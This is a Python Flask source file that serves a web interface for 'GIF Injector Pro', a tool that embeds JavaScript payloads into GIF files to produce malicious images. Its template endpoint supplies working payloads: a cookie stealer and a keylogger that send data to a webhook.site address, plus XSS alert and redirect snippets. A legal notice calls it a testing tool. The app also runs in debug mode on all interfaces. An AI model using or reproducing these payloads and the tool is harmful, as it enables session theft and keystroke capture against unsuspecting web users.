#!/usr/bin/env python3
"""
GIF Injector Pro Web Interface
Modern web UI for the GIF steganography tool
"""

from flask import Flask, render_template, request, jsonify, send_file
import os
import tempfile
import json
from pathlib import Path
import sys

# Add the CLI tool to path
sys.path.append('.')
from gif_injector import GIFInjector

app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB max file size

class WebInjector:
    def __init__(self):
        self.injector = GIFInjector(verbose=True)
    
    def process_request(self, operation_type, gif_file, payload, custom_output=None):
        """Process injection request from web interface"""
        try:
            with tempfile.NamedTemporaryFile(delete=False, suffix='.gif') as tmp_file:
                gif_file.save(tmp_file.name)
                input_path = Path(tmp_file.name)
                
                if custom_output:
                    output_path = Path(custom_output)
                else:
                    output_path = Path(f"web_{operation_type}_{input_path.stem}.gif")
                
                if operation_type == 'inject':
                    result = self.injector.inject_into_existing_gif(
                        payload.encode(), input_path, output_path
                    )
                else:
                    result = self.injector.generate_malicious_gif(
                        payload.encode(), output_path
                    )
                
                # Cleanup temp file
                try:
                    os.unlink(tmp_file.name)
                except:
                    pass
                
                return result
                
        except Exception as e:
            return {"status": "error", "message": str(e)}

web_injector = WebInjector()

@app.route('/')
def index():
    """Main web interface"""
    return render_template('index.html')

@app.route('/api/process', methods=['POST'])
def process_gif():
    """API endpoint for GIF processing"""
    try:
        operation_type = request.form.get('operation', 'create')
        payload = request.form.get('payload', '')
        custom_output = request.form.get('output_filename', '')
        
        if 'gif_file' not in request.files and operation_type == 'inject':
            return jsonify({
                "status": "error", 
                "message": "GIF file required for injection"
            })
        
        gif_file = request.files.get('gif_file')
        
        result = web_injector.process_request(
            operation_type, gif_file, payload, custom_output
        )
        
        return jsonify(result)
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/templates')
def get_templates():
    """Get payload templates"""
    templates = {
        "xss_basic": {
            "name": "Basic XSS",
            "payload": "alert('XSS by GIF Injector Pro');",
            "description": "Simple alert demonstration"
        },
        "cookie_stealer": {
            "name": "Cookie Stealer", 
            "payload": "fetch('https://webhook.site/YOUR_ID?c='+document.cookie);",
            "description": "Exfiltrate cookies to webhook"
        },
        "keylogger": {
            "name": "Keylogger",
            "payload": """document.addEventListener('keydown',function(e){fetch('https://webhook.site/YOUR_ID?k='+e.key);});""",
            "description": "Capture keyboard input"
        },
        "redirect": {
            "name": "Page Redirect",
            "payload": "window.location='https://example.com';",
            "description": "Redirect to different page"
        }
    }
    return jsonify(templates)

if __name__ == '__main__':
    # Create templates directory if it doesn't exist
    os.makedirs('templates', exist_ok=True)
    
    # Create the main template
    with open('templates/index.html', 'w') as f:
        f.write("""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GIF Injector Pro - Web Interface</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        .gradient-bg { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
        .glass-effect { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); }
    </style>
</head>
<body class="gradient-bg min-h-screen">
    <div class="container mx-auto px-4 py-8">
        <!-- Header -->
        <div class="text-center mb-12">
            <h1 class="text-5xl font-bold text-white mb-4">
                <i class="fas fa-image mr-4"></i>GIF Injector Pro
            </h1>
            <p class="text-xl text-white opacity-90">Advanced Steganography Web Interface</p>
        </div>

        <!-- Main Card -->
        <div class="max-w-6xl mx-auto bg-white rounded-2xl shadow-2xl overflow-hidden">
            <div class="md:flex">
                <!-- Sidebar -->
                <div class="md:w-1/3 bg-gray-800 text-white p-8">
                    <h2 class="text-2xl font-bold mb-6">
                        <i class="fas fa-cogs mr-2"></i>Configuration
                    </h2>
                    
                    <!-- Operation Type -->
                    <div class="mb-6">
                        <label class="block text-sm font-medium mb-2">Operation Type</label>
                        <select id="operationType" class="w-full bg-gray-700 border border-gray-600 rounded-lg px-4 py-2 text-white">
                            <option value="create">Create New GIF</option>
                            <option value="inject">Inject into Existing GIF</option>
                        </select>
                    </div>

                    <!-- File Upload (Conditional) -->
                    <div id="fileUploadSection" class="mb-6 hidden">
                        <label class="block text-sm font-medium mb-2">GIF File</label>
                        <div class="border-2 border-dashed border-gray-600 rounded-lg p-6 text-center">
                            <i class="fas fa-cloud-upload-alt text-3xl mb-2 text-gray-400"></i>
                            <p class="text-sm text-gray-400">Drag & drop or click to upload</p>
                            <input type="file" id="gifFile" accept=".gif" class="hidden">
                            <button onclick="document.getElementById('gifFile').click()" 
                                    class="mt-2 bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded-lg">
                                Choose File
                            </button>
                            <p id="fileName" class="text-xs mt-2 text-gray-400"></p>
                        </div>
                    </div>

                    <!-- Output Filename -->
                    <div class="mb-6">
                        <label class="block text-sm font-medium mb-2">Output Filename</label>
                        <input type="text" id="outputFilename" 
                               class="w-full bg-gray-700 border border-gray-600 rounded-lg px-4 py-2 text-white" 
                               placeholder="output_malicious.gif">
                    </div>

                    <!-- Quick Templates -->
                    <div class="mb-6">
                        <label class="block text-sm font-medium mb-2">Payload Templates</label>
                        <select id="payloadTemplates" class="w-full bg-gray-700 border border-gray-600 rounded-lg px-4 py-2 text-white mb-2"
                                onchange="loadTemplate()">
                            <option value="">Select a template...</option>
                            <option value="xss_basic">Basic XSS</option>
                            <option value="cookie_stealer">Cookie Stealer</option>
                            <option value="keylogger">Keylogger</option>
                            <option value="redirect">Page Redirect</option>
                        </select>
                    </div>

                    <!-- Action Buttons -->
                    <div class="space-y-3">
                        <button onclick="processGIF()" 
                                class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3 rounded-lg transition duration-200">
                            <i class="fas fa-play mr-2"></i>Execute
                        </button>
                        <button onclick="clearForm()" 
                                class="w-full bg-gray-600 hover:bg-gray-700 text-white py-2 rounded-lg">
                            <i class="fas fa-eraser mr-2"></i>Clear
                        </button>
                    </div>
                </div>

                <!-- Main Content -->
                <div class="md:w-2/3 p-8">
                    <h2 class="text-2xl font-bold text-gray-800 mb-6">
                        <i class="fas fa-code mr-2"></i>JavaScript Payload
                    </h2>
                    
                    <!-- Payload Editor -->
                    <div class="mb-6">
                        <textarea id="jsPayload" rows="12" 
                                  class="w-full bg-gray-50 border border-gray-300 rounded-lg p-4 font-mono text-sm"
                                  placeholder="Enter your JavaScript payload here..."></textarea>
                    </div>

                    <!-- Results Section -->
                    <div id="resultsSection" class="hidden">
                        <h3 class="text-xl font-bold text-gray-800 mb-4">
                            <i class="fas fa-chart-bar mr-2"></i>Results
                        </h3>
                        <div id="resultsContent" class="bg-gray-50 border border-gray-300 rounded-lg p-4">
                            <!-- Results will be displayed here -->
                        </div>
                    </div>

                    <!-- Legal Notice -->
                    <div class="mt-8 p-4 bg-yellow-50 border border-yellow-200 rounded-lg">
                        <div class="flex">
                            <i class="fas fa-exclamation-triangle text-yellow-500 mt-1 mr-3"></i>
                            <div>
                                <h4 class="font-bold text-yellow-800">Legal Notice</h4>
                                <p class="text-yellow-700 text-sm">
                                    This tool is for authorized security testing and educational purposes only. 
                                    Unauthorized use is strictly prohibited. Users are responsible for complying with all applicable laws.
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Toggle file upload based on operation type
        document.getElementById('operationType').addEventListener('change', function() {
            const fileSection = document.getElementById('fileUploadSection');
            fileSection.classList.toggle('hidden', this.value === 'create');
        });

        // File upload handler
        document.getElementById('gifFile').addEventListener('change', function(e) {
            const fileName = document.getElementById('fileName');
            if (this.files.length > 0) {
                fileName.textContent = 'Selected: ' + this.files[0].name;
            } else {
                fileName.textContent = '';
            }
        });

        // Load payload template
        function loadTemplate() {
            const templateSelect = document.getElementById('payloadTemplates');
            const payloadArea = document.getElementById('jsPayload');
            const templateId = templateSelect.value;
            
            if (templateId) {
                fetch('/api/templates')
                    .then(response => response.json())
                    .then(templates => {
                        if (templates[templateId]) {
                            payloadArea.value = templates[templateId].payload;
                        }
                    });
            }
        }

        // Process GIF
        function processGIF() {
            const formData = new FormData();
            formData.append('operation', document.getElementById('operationType').value);
            formData.append('payload', document.getElementById('jsPayload').value);
            formData.append('output_filename', document.getElementById('outputFilename').value);
            
            const gifFile = document.getElementById('gifFile').files[0];
            if (gifFile) {
                formData.append('gif_file', gifFile);
            }

            fetch('/api/process', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                displayResults(data);
            })
            .catch(error => {
                displayResults({status: 'error', message: 'Request failed: ' + error});
            });
        }

        // Display results
        function displayResults(data) {
            const resultsSection = document.getElementById('resultsSection');
            const resultsContent = document.getElementById('resultsContent');
            
            resultsSection.classList.remove('hidden');
            
            if (data.status === 'success') {
                let html = `<div class="text-green-700 bg-green-50 p-4 rounded-lg border border-green-200">
                    <h4 class="font-bold text-lg mb-2"><i class="fas fa-check-circle mr-2"></i>Success!</h4>`;
                
                for (const [key, value] of Object.entries(data)) {
                    if (key !== 'status') {
                        html += `<p class="mb-1"><strong>${key}:</strong> ${value}</p>`;
                    }
                }
                
                html += `</div>`;
                resultsContent.innerHTML = html;
            } else {
                resultsContent.innerHTML = `<div class="text-red-700 bg-red-50 p-4 rounded-lg border border-red-200">
                    <h4 class="font-bold text-lg mb-2"><i class="fas fa-times-circle mr-2"></i>Error</h4>
                    <p>${data.message || 'Unknown error occurred'}</p>
                </div>`;
            }
        }

        // Clear form
        function clearForm() {
            document.getElementById('jsPayload').value = '';
            document.getElementById('outputFilename').value = '';
            document.getElementById('payloadTemplates').selectedIndex = 0;
            document.getElementById('gifFile').value = '';
            document.getElementById('fileName').textContent = '';
            document.getElementById('resultsSection').classList.add('hidden');
        }
    </script>
</body>
</html>
        """)
    
    print("Starting GIF Injector Pro Web Interface...")
    print("Access the interface at: http://localhost:5000")
    app.run(debug=True, host='0.0.0.0', port=5000)
